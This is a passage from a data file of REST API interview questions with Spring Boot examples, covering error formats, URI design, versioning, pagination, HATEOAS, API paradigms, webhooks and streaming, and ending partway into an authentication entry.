    return new ResponseEntity<>(headers, HttpStatus.TEMPORARY_REDIRECT); // HTTP 307
}`,
    },
    interviewTip:
      "If preserving non-GET HTTP methods (like POST payment callbacks) across redirects is required, always specify 307 or 308 over 301/302.",
    commonTrap:
      "Using 301 for temporary maintenance redirects. Browsers cache 301 redirects infinitely in local disk cache, making it impossible to undo without user cache clearing.",
    followUpQuestions: [
      "How do search engine crawlers handle 301 vs 302 redirects?",
      "Why was HTTP 307 and 308 added to HTTP/1.1 specifications?",
    ],
    relatedTopics: ["REST APIs", "HTTP Redirection", "Status Codes"],
    tags: ["REST APIs", "HTTP"],
  },
  {
    topicSlug: "rest-apis",
    slug: "rfc-7807-problem-details-error-handling",
    title: "How do you standardize REST API error responses using RFC 7807 (Problem Details)?",
    difficulty: "MEDIUM",
    subtopic: "Error Handling",
    synopsis: "Standardized JSON schema (`application/problem+json`) for expressive REST API errors.",
    shortAnswer:
      "RFC 7807 defines a standard machine-readable format (`application/problem+json`) for conveying error details in HTTP APIs. It uses standard members: `type` (URI identifier), `title` (short summary), `status` (HTTP status code), `detail` (human-readable explanation), and `instance` (request URI).",
    detailedExplanation: [
      "**Standard Key Fields:**",
      "- `type`: A URI reference identifying the specific error type (e.g. `https://api.example.com/errors/out-of-credit`).",
      "- `title`: Short human-readable summary of problem type.",
      "- `status`: HTTP status code returned by server.",
      "- `detail`: Human-readable explanation specific to this occurrence.",
      "- `instance`: URI path of the request that caused the error.",
      "**Spring Boot 3 Support:** Spring Boot 3 natively supports RFC 7807 via `ProblemDetail` class and `spring.mvc.problem-details.enabled=true`.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Boot 3 @RestControllerAdvice returning RFC 7807 ProblemDetail
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(InsufficientFundsException.class)
    public ProblemDetail handleInsufficientFunds(InsufficientFundsException ex) {
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
                HttpStatus.BAD_REQUEST, ex.getMessage());
        problem.setType(URI.create("https://api.example.com/errors/insufficient-funds"));
        problem.setTitle("Payment Processing Error");
        problem.setProperty("currentBalance", ex.getBalance());
        return problem;
    }
}`,
    },
    interviewTip:
      "Mention that using RFC 7807 prevents custom, inconsistent error structures across team endpoints and allows SDKs to parse errors automatically.",
    commonTrap:
      "Exposing internal database stack traces or SQL syntax errors inside detail fields in production environments.",
    followUpQuestions: [
      "How to enable RFC 7807 problem details in Spring Boot 3?",
      "What media type header must be set for RFC 7807 responses?",
    ],
    relatedTopics: ["REST APIs", "Error Handling", "Spring Boot"],
    tags: ["REST APIs", "Error Handling", "API Design"],
  },

  /* ==========================================================================
     4. Resource Design & URI Best Practices
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "uri-naming-conventions-best-practices",
    title: "What are URI / URL naming best practices for RESTful APIs?",
    difficulty: "EASY",
    subtopic: "Resource Design",
    synopsis: "Plural nouns over verbs, kebab-case, lowercase, avoiding extensions, and hierarchy.",
    shortAnswer:
      "RESTful URIs should use plural nouns representing resources (`/users`), lowercase letters with hyphen-separated words (`/order-items`), avoid trailing slashes, avoid file extensions (`.json`), and refrain from embedding HTTP verbs (`/getUsers` is bad; `/users` + `GET` verb is correct).",
    detailedExplanation: [
      "**Use Plural Nouns:** Standardize on collection names: `/users`, `/orders`, `/products`. (Avoid `/getUser` or `/createOrder`).",
      "**HTTP Verbs Handle Actions:** Use HTTP methods (`GET`, `POST`, `PUT`, `DELETE`) to dictate actions rather than embedding verbs in URI strings (`/orders/123/cancel` -> `POST /orders/123/cancellations` or `PATCH /orders/123` with `{ status: 'CANCELLED' }`).",
      "**Hyphens for Readability:** Use kebab-case (`/order-items`). Avoid camelCase or snake_case in URIs.",
      "**Hierarchical Sub-Resources:** Represent relationships logically: `/users/42/orders` (Orders belonging to User 42). Limit nesting depth to 2-3 levels max.",
      "**Filtering via Query Parameters:** Use query parameters for filtering, sorting, and pagination: `/products?category=electronics&sort=-price&page=2`.",
    ],
    example: {
      language: "JAVA",
      code: `// Good RESTful URI Design:
// GET /api/v1/customers/89/invoices?status=PAID&limit=10

// Anti-Patterns (RPC style):
// GET /api/getPaidCustomerInvoices?customerId=89
// POST /api/deleteCustomer?id=89`,
    },
    interviewTip:
      "Summarize the rule: 'URIs identify Resources (Nouns); HTTP Methods identify Actions (Verbs); Query Parameters identify Filters/Modifiers.'",
    commonTrap:
      "Nesting sub-resources too deeply (e.g. `/authors/1/books/2/chapters/3/paragraphs/4`). Deep nesting creates unwieldy URIs; flatten to `/chapters/3/paragraphs/4`.",
    followUpQuestions: [
      "How do you model non-CRUD actions (like password reset or search) in REST URIs?",
      "Should URIs be case-sensitive?",
    ],
    relatedTopics: ["REST APIs", "URI Design", "API Architecture"],
    tags: ["REST APIs", "API Design", "Clean Code"],
  },
  {
    topicSlug: "rest-apis",
    slug: "designing-sub-resources-relationships",
    title: "How do you design sub-resource relationships in REST URIs?",
    difficulty: "EASY",
    subtopic: "Resource Design",
    synopsis: "Modeling parent-child entity hierarchies vs direct top-level resource access.",
    shortAnswer:
      "Parent-child relationships are expressed hierarchically: `/parents/{parentId}/children`. If a child resource cannot exist independently without the parent (e.g., LineItems in an Order), nest it. If a resource has a globally unique ID and independent lifecycle, prefer exposing it directly at top-level (`/items/{itemId}`).",
    detailedExplanation: [
      "**Dependent Sub-Resource (Nested):** `GET /users/42/orders` (Retrieves orders owned by user 42). `POST /users/42/orders` (Creates an order for user 42).",
      "**Independent Resource (Direct Top-Level):** `GET /orders/9001` (Direct lookup by globally unique Order ID is cleaner than `GET /users/42/orders/9001`).",
      "**Rule of Thumb:** Limit nesting to maximum 2 levels (`/resource/{id}/sub-resource`). More than 2 levels indicates a need to flatten top-level endpoints.",
    ],
    example: {
      language: "JAVA",
      code: `// Nesting 1 Level (Parent-Child relationship)
@GetMapping("/users/{userId}/addresses")
public List<Address> getUserAddresses(@PathVariable Long userId) {
    return userService.getAddresses(userId);
}

// Flattening for direct lookup (Cleaner!)
@GetMapping("/addresses/{addressId}")
public Address getAddressById(@PathVariable Long addressId) {
    return addressService.findById(addressId);
}`,
    },
    interviewTip:
      "State: 'Use nested URIs to show ownership context; use direct top-level URIs when operating directly on entities with primary key IDs.'",
    commonTrap:
      "Requiring client to pass parent IDs when modifying an item by its unique UUID (`PUT /categories/5/products/99/tags/12`). Pass top-level `/tags/12` instead.",
    followUpQuestions: [
      "How do you handle many-to-many relationships in REST URIs?",
      "When is relationship mapping in URIs anti-pattern?",
    ],
    relatedTopics: ["REST APIs", "URI Design", "Data Modeling"],
    tags: ["REST APIs", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "content-negotiation-accept-vs-content-type",
    title: "How does Content Negotiation work in REST APIs (`Accept` vs `Content-Type` headers)?",
    difficulty: "MEDIUM",
    subtopic: "Resource Design",
    synopsis: "Negotiating representations via `Content-Type` (incoming body format) and `Accept` (expected response format).",
    shortAnswer:
      "`Content-Type` header specifies the data format of the HTTP request body sent by the client. `Accept` header specifies the desired response format the client expects back from the server (e.g., JSON, XML, PDF). The server responds with `406 Not Acceptable` if it cannot satisfy the `Accept` header.",
    detailedExplanation: [
      "**Content-Type (Request & Response):** Tells the parser how to decode the payload. `Content-Type: application/json` or `application/xml` or `multipart/form-data`.",
      "**Accept (Client Preference):** Client sends `Accept: application/json, application/xml;q=0.9`. The server picks the matching converter.",
      "**Quality Factors (q-values):** Clients specify preference weightings: `Accept: application/json;q=1.0, application/xml;q=0.5`.",
      "**Status Codes:** Server returns `415 Unsupported Media Type` if request `Content-Type` cannot be parsed; server returns `406 Not Acceptable` if server cannot produce requested `Accept` format.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring MVC support for Content Negotiation
@GetMapping(value = "/reports/{id}", 
            produces = { MediaType.APPLICATION_JSON_VALUE, MediaType.APPLICATION_XML_VALUE })
public Report getReport(@PathVariable String id) {
    return reportService.generate(id);
}`,
    },
    interviewTip:
      "Clarify: `Content-Type` = 'What format I am sending you'; `Accept` = 'What format I want you to send back to me'.",
    commonTrap:
      "Using URI extensions like `/users/42.json` or `/users/42.xml` instead of standard HTTP `Accept` headers for content negotiation.",
    followUpQuestions: [
      "What is `415 Unsupported Media Type` vs `406 Not Acceptable`?",
      "How to configure Spring WebMvcConfigurer for content negotiation?",
    ],
    relatedTopics: ["REST APIs", "Content Negotiation", "HTTP Headers"],
    tags: ["REST APIs", "HTTP", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "api-versioning-strategies-rest",
    title: "How do you handle API Versioning in RESTful systems?",
    difficulty: "MEDIUM",
    subtopic: "Resource Design",
    synopsis: "URI path versioning, Query parameter, Custom Headers, and Accept Header (Media Type) negotiation.",
    shortAnswer:
      "There are 4 main API versioning strategies: 1) URI Path (`/api/v1/users`), 2) Query Parameter (`/users?version=1`), 3) Custom Header (`X-API-Version: 1`), and 4) Media Type / Accept Header (`Accept: application/vnd.company.v1+json`). URI Path is the most popular in industry.",
    detailedExplanation: [
      "**1. URI Path Versioning (`/api/v1/users`):** Most common, developer-friendly, and cache-friendly. Easy to route at API Gateway level. Trade-off: Violates strict REST pure URI stability.",
      "**2. Query Parameter (`/users?v=1`):** Simple, easy to implement default fallbacks. Trade-off: Easy to omit in client requests.",
      "**3. Custom Header (`X-API-Version: 1`):** Keeps URIs clean. Trade-off: Invisible in browser address bar, complex CDN caching rules.",
      "**4. Media Type / Accept Header (`Accept: application/vnd.company.v1+json`):** Purest RESTful approach (Content Negotiation). Trade-off: Harder for third-party developers to test via simple curl or browser.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring MVC Header and Params Versioning
@RestController
@RequestMapping("/users")
public class VersionedUserController {

    // Header Versioning
    @GetMapping(headers = "X-API-VERSION=1")
    public UserV1 getUserV1() { return new UserV1("John Doe"); }

    @GetMapping(headers = "X-API-VERSION=2")
    public UserV2 getUserV2() { return new UserV2("John", "Doe"); }
}`,
    },
    interviewTip:
      "Recommend URI Path versioning (`/v1/`) for public APIs due to simplicity, routing efficiency at the API Gateway, and clear CDN caching keys.",
    commonTrap:
      "Creating minor version endpoints for non-breaking changes (e.g. `/v1.1/`, `/v1.2/`). Reserve major versions (`/v1/`, `/v2/`) exclusively for breaking API changes.",
    followUpQuestions: [
      "What constitutes a breaking vs non-breaking API change?",
      "How to implement Sunset headers when deprecating old API versions?",
    ],
    relatedTopics: ["REST APIs", "API Versioning", "Architecture"],
    tags: ["REST APIs", "API Design", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "pagination-strategies-offset-vs-cursor",
    title: "How do you handle Pagination in REST APIs (Offset-based vs Cursor-based)?",
    difficulty: "MEDIUM",
    subtopic: "Resource Design",
    synopsis: "Offset/Limit pagination for UI page numbers vs Cursor-based pagination for high-volume real-time datasets.",
    shortAnswer:
      "Offset-based pagination (`?page=3&limit=20` or `?offset=40&limit=20`) uses SQL `OFFSET`. It allows jumping to arbitrary page numbers but suffers from slow O(N) DB scans and skipped/duplicate record bugs on live feeds. Cursor-based pagination (`?starting_after=obj_123&limit=20`) uses a pointer to a unique indexed record, delivering O(1) query execution and stability on mutating feeds.",
    detailedExplanation: [
      "**Offset-Based Pagination:**",
      "- Query: `SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 10000;`",
      "- Pros: Easy to implement, supports numbered pagination UI buttons (Page 1, 2, 3).",
      "- Cons: Performance degrades rapidly on deep offsets (`OFFSET 1000000` scans and discards 1M rows); new items inserted at top cause offset drift (users see duplicate items across pages).",
      "**Cursor-Based (Keyset) Pagination:**",
      "- Query: `SELECT * FROM posts WHERE id < 'post_500' ORDER BY id DESC LIMIT 20;`",
      "- Pros: Extremely fast O(1) index lookup regardless of depth; completely immune to item insertion/deletion drift.",
      "- Cons: Cannot jump directly to arbitrary page numbers (e.g. 'Jump to Page 5'); requires returning `next_cursor` in API response payload.",
    ],
    example: {
      language: "JAVA",
      code: `// Cursor-based Pagination API Response Payload
{
  "data": [
    { "id": "usr_99", "name": "Alice" },
    { "id": "usr_98", "name": "Bob" }
  ],
  "pagination": {
    "next_cursor": "usr_98",
    "has_more": true
  }
}`,
    },
    interviewTip:
      "For infinite-scroll mobile feeds (Twitter/Instagram) or high-scale DB tables, advocate Cursor-based pagination. For static admin tables requiring specific page numbers, use Offset pagination.",
    commonTrap:
      "Using Offset pagination on high-frequency datasets (like financial transactions or chat logs). Offset drift will cause missing or duplicated entries for users.",
    followUpQuestions: [
      "How to implement keyset pagination in SQL using composite keys?",
      "How to structure pagination response metadata standardized headers vs response body?",
    ],
    relatedTopics: ["REST APIs", "Pagination", "Database"],
    tags: ["REST APIs", "Performance", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "sorting-filtering-field-selection-rest",
    title: "How do you handle Sorting, Filtering, and Field Selection in RESTful APIs?",
    difficulty: "EASY",
    subtopic: "Resource Design",
    synopsis: "Standardizing query parameters for sorting (`?sort=-price`), filtering (`?status=ACTIVE`), and field selection (`?fields=id,name`).",
    shortAnswer:
      "Sorting, filtering, and field selection should be passed via URL Query Parameters. Use `?sort=-created_at,name` (hyphen/minus for descending), direct key-value pairs for filtering (`?status=ACTIVE&min_price=10`), and `?fields=id,name,email` for sparse fieldset projections to reduce payload size.",
    detailedExplanation: [
      "**Filtering:** `GET /products?category=electronics&in_stock=true`.",
      "**Complex Filter Operators:** `GET /products?price=gte:100&created_at=lte:2026-01-01`.",
      "**Sorting:** `GET /users?sort=-created_at` (Minus sign `-` indicates DESC; no sign indicates ASC). Multi-column sort: `?sort=-role,lastName`.",
      "**Sparse Fieldsets (Field Selection):** `GET /users?fields=id,email,profilePic` (Server maps query parameter to SQL `SELECT id, email, profile_pic` projection, saving network bandwidth).",
    ],
    example: {
      language: "JAVA",
      code: `// Processing Query Params in Spring Data JPA Specifications
@GetMapping("/products")
public Page<Product> searchProducts(
        @RequestParam(required = false) String category,
        @RequestParam(required = false, defaultValue = "-createdAt") String sort,
        @RequestParam(required = false) String fields,
        Pageable pageable) {
    return productService.search(category, sort, fields, pageable);
}`,
    },
    interviewTip:
      "Sparse fieldsets (`?fields=...`) are REST's answer to GraphQL's field selection capability, reducing mobile payload size significantly without needing GraphQL infrastructure.",
    commonTrap:
      "Sending JSON search filter criteria inside the HTTP POST body for a search request (e.g. `POST /search/products`). Use `GET /products` with query params to ensure requests remain cacheable by CDNs.",
    followUpQuestions: [
      "How do you convert query parameter filter strings into dynamic SQL specifications in JPA?",
      "How does GraphQL compare to REST sparse fieldsets?",
    ],
    relatedTopics: ["REST APIs", "Query Parameters", "Performance"],
    tags: ["REST APIs", "API Design"],
  },

  /* ==========================================================================
     5. Advanced Architecture, REST Maturity & Alternative Paradigms
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "hateoas-explained-rest",
    title: "What is HATEOAS (Hypermedia As The Engine Of Application State)?",
    difficulty: "MEDIUM",
    subtopic: "Advanced Architecture",
    synopsis: "Dynamic client state navigation via hypermedia link objects embedded in API responses.",
    shortAnswer:
      "HATEOAS is a constraint of REST where the server returns hypermedia links inside response payloads. These links inform the client of allowable state transitions and next valid API actions dynamically, decoupling the client from hardcoded endpoint URLs.",
    detailedExplanation: [
      "**Dynamic Discovery:** Just like a human navigates a website by clicking HTML links without hardcoding URLs, a REST client navigates an API using hypermedia links returned in JSON responses (HAL / JSON-LD format).",
      "**Decoupling:** If an account balance drops below zero, the server omits the `withdraw` link and adds an `overdraft-deposit` link dynamically. The client simply checks for link existence rather than duplicating business logic.",
      "**HAL Format (Hypertext Application Language):** Uses `_links` map containing `self`, `rel`, and `href` properties.",
    ],
    example: {
      language: "JAVA",
      code: `// HATEOAS Response Payload for an Order (Spring HATEOAS HAL format)
{
  "orderId": 501,
  "status": "PAYMENT_PENDING",
  "totalAmount": 99.50,
  "_links": {
    "self": { "href": "https://api.example.com/orders/501" },
    "cancel": { "href": "https://api.example.com/orders/501/cancel", "method": "POST" },
    "payment": { "href": "https://api.example.com/orders/501/payments", "method": "POST" }
  }
}`,
    },
    interviewTip:
      "Acknowledge that while HATEOAS represents the highest maturity level of REST (Level 3), it is rarely implemented in full in enterprise APIs due to payload size overhead and client complexity.",
    commonTrap:
      "Hardcoding state machine rules on mobile clients instead of relying on link availability returned by HATEOAS responses.",
    followUpQuestions: [
      "What is the HAL (Hypertext Application Language) specification?",
      "Why is HATEOAS rarely adopted in modern web startups?",
    ],
    relatedTopics: ["REST APIs", "HATEOAS", "Architecture"],
    tags: ["REST APIs", "Architecture", "HATEOAS"],
  },
  {
    topicSlug: "rest-apis",
    slug: "richardson-maturity-model-levels",
    title: "What is the Richardson Maturity Model for REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "Advanced Architecture",
    synopsis: "4-level model grading API RESTfulness: Level 0 (POX), Level 1 (Resources), Level 2 (HTTP Verbs), Level 3 (HATEOAS).",
    shortAnswer:
      "The Richardson Maturity Model breaks down REST principles into 4 progressive levels: Level 0 (Single URI RPC / Plain Old XML), Level 1 (Individual Resource URIs), Level 2 (HTTP Verbs & Status Codes), and Level 3 (Hypermedia Controls / HATEOAS).",
    detailedExplanation: [
      "**Level 0 (The Swamp of POX):** Single URI endpoint using POST for all operations with custom payload commands (e.g. SOAP, XML-RPC, or `POST /api` with `{ action: 'getUser' }`).",
      "**Level 1 (Resources):** Uses distinct resource URIs (`/users/1`, `/orders/2`), but uses a single HTTP method (usually POST) for everything.",
      "**Level 2 (HTTP Verbs & Status Codes):** Uses distinct resource URIs AND correct HTTP verbs (`GET`, `POST`, `PUT`, `DELETE`) with proper status codes (`200`, `201`, `404`). Most production 'REST' APIs operate at Level 2.",
      "**Level 3 (Hypermedia Controls):** Fully RESTful API incorporating HATEOAS. Responses contain dynamic hypermedia links directing clients to valid next actions.",
    ],
    example: {
      language: "JAVA",
      code: `// Level 0: POST /apiService -> { "command": "deleteUser", "userId": 42 }
// Level 1: POST /users/42/delete -> { "userId": 42 }
// Level 2: DELETE /users/42 -> Status 204 No Content
// Level 3: DELETE /users/42 -> Status 204 No Content + HATEOAS links in parent response`,
    },
    interviewTip:
      "When asked if your company's API is truly RESTful, answer: 'We operate at Richardson Maturity Model Level 2, utilizing dedicated URIs, standard HTTP verbs, and RFC status codes.'",
    commonTrap:
      "Calling a Level 0 or Level 1 API 'RESTful'. An API is RPC-style until it reaches Level 2.",
    followUpQuestions: [
      "Why do most modern enterprise APIs stop at Level 2 of the Richardson Maturity Model?",
      "How does GraphQL fit into the Richardson Maturity Model?",
    ],
    relatedTopics: ["REST APIs", "Architecture", "Design Patterns"],
    tags: ["REST APIs", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "rest-vs-graphql-vs-grpc",
    title: "What is the difference between REST, GraphQL, and gRPC?",
    difficulty: "MEDIUM",
    subtopic: "API Paradigms",
    synopsis: "Resource HTTP endpoints vs flexible query language vs binary Protobuf RPC.",
    shortAnswer:
      "REST is an architectural style based on standard HTTP verbs and fixed resource URLs. GraphQL is a query language allowing clients to request exact fields in a single POST request, eliminating over-fetching. gRPC is a high-performance framework using Protocol Buffers over HTTP/2 for low-latency microservice RPCs.",
    detailedExplanation: [
      "**REST (Representational State Transfer):** Uses standard HTTP methods (GET, POST, PUT, DELETE) and JSON payloads. Simple, universally cached by browsers/CDNs, but suffers from over-fetching (getting fields you don't need) or under-fetching (requiring N+1 API requests).",
      "**GraphQL:** Exposes a single `/graphql` endpoint. Client specifies exact fields in a query schema. Eliminates under-fetching and over-fetching, ideal for frontend web/mobile clients.",
      "**gRPC (Google RPC):** Uses binary Protocol Buffers (strongly typed `.proto` schemas) over HTTP/2. Offers 10x faster serialization than JSON and supports multiplexed streaming. Best for internal backend microservice communication.",
    ],
    example: {
      language: "JAVA",
      code: `// gRPC Service Definition (.proto)
syntax = "proto3";
service UserService {
  rpc GetUser (UserRequest) returns (UserResponse);
}
message UserRequest { string user_id = 1; }
message UserResponse { string name = 1; string email = 2; }`,
    },
    interviewTip:
      "When designing APIs: Use REST for public public-facing third-party APIs; use GraphQL for complex client-driven web/mobile frontends; use gRPC for internal high-throughput microservice-to-microservice RPCs.",
    commonTrap:
      "Choosing GraphQL for internal microservice communication where gRPC binary Protobuf is significantly faster.",
    followUpQuestions: [
      "How does gRPC achieve zero-copy serialization?",
      "What is the N+1 problem in GraphQL and how does DataLoader solve it?",
      "How does HTTP/2 multiplexing benefit gRPC?",
    ],
    relatedTopics: ["REST APIs", "GraphQL", "gRPC", "Protobuf"],
    tags: ["API Design", "Microservices"],
  },
  {
    topicSlug: "rest-apis",
    slug: "over-fetching-and-under-fetching-explained",
    title: "What is Over-fetching and Under-fetching in REST APIs?",
    difficulty: "EASY",
    subtopic: "API Paradigms",
    synopsis: "Receiving unnecessary fields in payload (over-fetching) vs executing multiple sequential requests to assemble data (under-fetching).",
    shortAnswer:
      "Over-fetching occurs when a REST endpoint returns more data fields than the client actually needs (e.g. mobile app requesting user name receives 50 database attributes). Under-fetching occurs when a single endpoint returns insufficient data, forcing the client to issue multiple sequential round-trip requests (N+1 requests).",
    detailedExplanation: [
      "**Over-fetching Consequences:** Wasteful mobile data consumption, increased JSON serialization CPU overhead, and higher latency.",
      "**Under-fetching Consequences:** High network latency (waterfall request patterns on 3G/4G networks). Client must fetch `/users/1`, then `/users/1/orders`, then `/orders/50/items` sequentially.",
      "**REST Solutions:** Use sparse fieldsets (`?fields=id,name`) and composite view endpoints (`/dashboard-summary`).",
      "**Alternative Paradigm Solution:** GraphQL natively solves both problems by allowing clients to specify exact nested query trees in a single HTTP request.",
    ],
    example: {
      language: "JAVA",
      code: `// REST Solution for Under-fetching: Composite DTO / Dashboard Endpoint
@GetMapping("/dashboard")
public DashboardDto getDashboard(@AuthenticationPrincipal User user) {
    UserProfile profile = userService.getProfile(user.getId());
    List<Order> recentOrders = orderService.getRecent(user.getId());
    Notifications unread = notificationService.getUnread(user.getId());
    
    return new DashboardDto(profile, recentOrders, unread); // Single HTTP round-trip!
}`,
    },
    interviewTip:
      "Highlight how backend-for-frontend (BFF) pattern or sparse fieldsets (`?fields=...`) mitigate over-fetching and under-fetching in REST architectures.",
    commonTrap:
      "Creating hundreds of hyper-specific REST endpoints to avoid over-fetching, causing API surface fragmentation.",
    followUpQuestions: [
      "What is the Backend-for-Frontend (BFF) design pattern?",
      "How does GraphQL eliminate over-fetching and under-fetching?",
    ],
    relatedTopics: ["REST APIs", "GraphQL", "BFF Pattern"],
    tags: ["REST APIs", "Performance", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "asynchronous-long-running-operations-rest",
    title: "How do you handle Asynchronous long-running operations in REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "Advanced Architecture",
    synopsis: "HTTP 202 Accepted status code with Location header status polling endpoint or webhooks.",
    shortAnswer:
      "For tasks taking longer than 2-3 seconds (e.g. video encoding, PDF generation), the API should immediately return HTTP `202 Accepted` with a `Location` header pointing to a status polling endpoint (`/jobs/job-88`). Once the task completes, the polling endpoint returns `303 See Other` redirecting to the generated resource.",
    detailedExplanation: [
      "**Avoid HTTP Timeouts:** Synchronous HTTP requests held open for 30+ seconds cause API Gateway socket timeouts (504 Gateway Timeout) and block server worker threads.",
      "**Workflow Execution:**",
      "1. Client issues `POST /reports` (Triggers async task in RabbitMQ/Kafka queue).",
      "2. Server responds immediately with HTTP `202 Accepted` + `Location: /jobs/job-88` + payload `{ 'jobId': 'job-88', 'status': 'PROCESSING' }`.",
      "3. Client polls `GET /jobs/job-88` (Returns `{ 'status': 'IN_PROGRESS', 'progress': 65 }`).",
      "4. Upon completion, `GET /jobs/job-88` returns `303 See Other` with `Location: /reports/rep-9001` or `{ 'status': 'COMPLETED', 'resultUrl': '/reports/rep-9001' }`.",
    ],
    example: {
      language: "JAVA",
      code: `@PostMapping("/reports")
public ResponseEntity<JobStatusDto> createAsyncReport(@RequestBody ReportRequest request) {
    String jobId = asyncReportService.enqueueReportGeneration(request);
    
    URI location = ServletUriComponentsBuilder.fromCurrentContextPath()
            .path("/api/v1/jobs/{id}").buildAndExpand(jobId).toUri();
            
    return ResponseEntity.accepted() // HTTP 202 Accepted
            .location(location)
            .body(new JobStatusDto(jobId, "QUEUED"));
}`,
    },
    interviewTip:
      "Explain the alternative to polling: Webhooks. For multi-minute background jobs, mention returning 202 Accepted and notifying the client via a registered Webhook callback URL when finished.",
    commonTrap:
      "Holding open a synchronous HTTP connection while waiting for background database batch processing or external 3rd-party API responses.",
    followUpQuestions: [
      "What is the difference between Webhooks and HTTP Status Polling?",
      "What status code should a status polling endpoint return while the job is still running vs finished?",
    ],
    relatedTopics: ["REST APIs", "Async Processing", "Webhooks"],
    tags: ["REST APIs", "Architecture", "Async"],
  },
  {
    topicSlug: "rest-apis",
    slug: "webhooks-vs-rest-polling-vs-sse",
    title: "What is a Webhook and how does it differ from traditional REST Polling?",
    difficulty: "EASY",
    subtopic: "Advanced Architecture",
    synopsis: "Event-driven push callbacks (Webhooks) vs client-initiated pull loops (Polling).",
    shortAnswer:
      "REST Polling is a client-driven 'pull' mechanism where the client repeatedly queries an endpoint (`GET /status`) on a timer. A Webhook is an event-driven 'push' mechanism where the server makes an HTTP POST request to a client-registered callback URL as soon as an event occurs.",
    detailedExplanation: [
      "**Polling Drawbacks:** Wastes bandwidth and server CPU (99% of polling checks return 'no change'). High latency between event occurrence and next polling interval.",
      "**Webhook Advantages:** Near zero-latency real-time notification. Zero wasted traffic when no events occur.",
      "**Webhook Security Best Practices:** Webhook providers (Stripe, GitHub) sign payloads using HMAC-SHA256 signature headers (`X-Signature-256`) so clients can verify request authenticity.",
      "**Webhook Retries:** Webhook providers implement exponential backoff retry mechanisms if the client's endpoint responds with 5xx or times out.",
    ],
    example: {
      language: "JAVA",
      code: `// Client Receiver for Stripe Webhook (Verifying HMAC Signature)
@PostMapping("/webhooks/stripe")
public ResponseEntity<Void> handleStripeWebhook(
        @RequestBody String payload,
        @RequestHeader("Stripe-Signature") String sigHeader) {
    try {
        Event event = Webhook.constructEvent(payload, sigHeader, webhookSecret);
        if ("payment_intent.succeeded".equals(event.getType())) {
            paymentService.fulfillOrder(event);
        }
        return ResponseEntity.ok().build();
    } catch (SignatureVerificationException e) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST).build(); // 400
    }
}`,
    },
    interviewTip:
      "Highlight HMAC signature verification (`X-Hub-Signature`) when discussing Webhooks. Unsigned webhooks leave clients vulnerable to forgery attacks.",
    commonTrap:
      "Failing to respond with 200 OK immediately from a webhook endpoint. Process heavy work asynchronously off the webhook thread to prevent provider timeout retries.",
    followUpQuestions: [
      "How do you handle duplicate webhook event delivery (Idempotency)?",
      "What is HMAC SHA-256 signing in Webhooks?",
    ],
    relatedTopics: ["REST APIs", "Webhooks", "Event-Driven"],
    tags: ["REST APIs", "Webhooks", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "server-sent-events-vs-websockets-vs-rest",
    title: "What is Server-Sent Events (SSE) vs WebSockets vs REST HTTP requests?",
    difficulty: "MEDIUM",
    subtopic: "Advanced Architecture",
    synopsis: "Unidirectional server push over HTTP (SSE) vs full-duplex TCP streaming (WebSockets) vs Request-Response (REST).",
    shortAnswer:
      "REST is request-response over HTTP. Server-Sent Events (SSE) provides unidirectional server-to-client streaming over standard persistent HTTP (`text/event-stream`). WebSockets provides full-duplex, bi-directional, real-time communication over a single persistent TCP connection.",
    detailedExplanation: [
      "**REST HTTP:** Client initiates, server responds. Best for CRUD operations, document retrieval, and standard API transactions.",
      "**Server-Sent Events (SSE):** Unidirectional (Server -> Client). Uses standard HTTP persistent connections with `Content-Type: text/event-stream`. Auto-reconnects automatically on disconnect. Best for live stock tickers, LLM text streaming (ChatGPT responses), and notification feeds.",
      "**WebSockets:** Full-Duplex Bi-directional (Client <-> Server). Upgrades HTTP connection (`101 Switching Protocols`) to custom WebSocket protocol (`ws://` or `wss://`). Best for multiplayer gaming, collaborative whiteboards, and real-time chat applications.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Boot SSE Endpoint for LLM Text Streaming
@GetMapping(value = "/ai/stream", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
public Flux<String> streamAiResponse(@RequestParam String prompt) {
    return aiService.generateStream(prompt); // Streams text tokens continuously!
}`,
    },
    interviewTip:
      "Mention that ChatGPT's text streaming uses SSE (`text/event-stream`) because it is unidirectional server-to-client streaming over standard HTTP headers with firewall-friendly compatibility.",
    commonTrap:
      "Choosing WebSockets when SSE is sufficient. WebSockets bypass standard HTTP infrastructure (headers, proxies, load balancers, caching).",
    followUpQuestions: [
      "Why is SSE easier to scale through standard HTTP load balancers than WebSockets?",
      "How does connection multiplexing in HTTP/2 solve SSE browser connection limits?",
    ],
    relatedTopics: ["REST APIs", "SSE", "WebSockets", "Streaming"],
    tags: ["REST APIs", "Streaming", "WebSockets"],
  },

  /* ==========================================================================
     6. Authentication, Authorization & Security
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "rest-api-authentication-methods-overview",
    title: "How do you implement Authentication and Authorization in REST APIs?",
    difficulty: "EASY",
    subtopic: "Security",
    synopsis: "Basic Auth, API Keys, Bearer Tokens (JWT), and OAuth 2.0 / OpenID Connect.",
    shortAnswer:
      "REST API Authentication verifies identity using 4 primary standards: 1) Basic Auth (`Authorization: Basic base64`), 2) API Keys (`X-API-Key`), 3) Bearer Tokens (`Authorization: Bearer <JWT>`), and 4) OAuth 2.0 / OpenID Connect. Bearer JWTs are standard for stateless microservices.",
    detailedExplanation: [
      "**Basic Auth:** Transmits `username:password` encoded in Base64 in `Authorization: Basic ...` header. Simple, but sends credentials on every request; strictly requires HTTPS.",
      "**API Keys:** Long-lived random strings passed in custom header (`X-API-Key`). Used primarily for developer service-to-service monetization tracking.",
